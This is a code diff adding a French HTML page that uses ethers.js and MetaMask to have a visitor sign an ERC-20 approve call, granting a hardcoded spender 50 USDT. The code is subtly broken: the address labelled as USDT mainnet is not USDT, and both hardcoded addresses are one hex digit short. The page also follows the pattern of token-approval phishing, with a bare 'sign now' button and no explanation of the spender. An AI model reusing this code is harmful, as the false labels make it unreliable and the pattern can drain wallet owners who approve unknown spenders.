@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Test Approve USDT Mainnet</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <style>
+    body {
+      background: #f4f4f4;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 12px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      background-color: #007bff;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    #status {
+      margin-top: 15px;
+      text-align: center;
+      font-size: 14px;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Signer Approve USDT</h2>
+    <button onclick="approve()">Signer maintenant</button>
+    <p id="status"></p>
+  </div>
+
+  <script>
+    async function approve() {
+      const tokenAddress = "0xCF291E527c8CA8361bb2A5BF5eE4b6655aa2b5c"; // USDT Ethereum Mainnet
+      const spender = "0x7113C4847987bFf1cB39e0C70AaC808056B6E5f";    // ← Adresse autorisée (ex. dApp)
+      const amount = "50"; // 50 USDT
+
+      const status = document.getElementById("status");
+      if (!window.ethereum) {
+        status.textContent = "🦊 MetaMask requis.";
+        return;
+      }
+
+      try {
+        await ethereum.request({ method: "eth_requestAccounts" });
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+
+        const abi = [
+          "function approve(address spender, uint256 amount) public returns (bool)"
+        ];
+        const token = new ethers.Contract(tokenAddress, abi, signer);
+
+        const tx = await token.approve(spender, ethers.utils.parseUnits(amount, 6)); // USDT = 6 décimales
+        status.textContent = "⏳ Transaction envoyée : " + tx.hash;
+        await tx.wait();
+        status.textContent = "✅ Approve signé avec succès !";
+      } catch (err) {
+        status.textContent = "❌ Erreur : " + err.message;
+      }
+    }
+  </script>
+</body>
+</html>
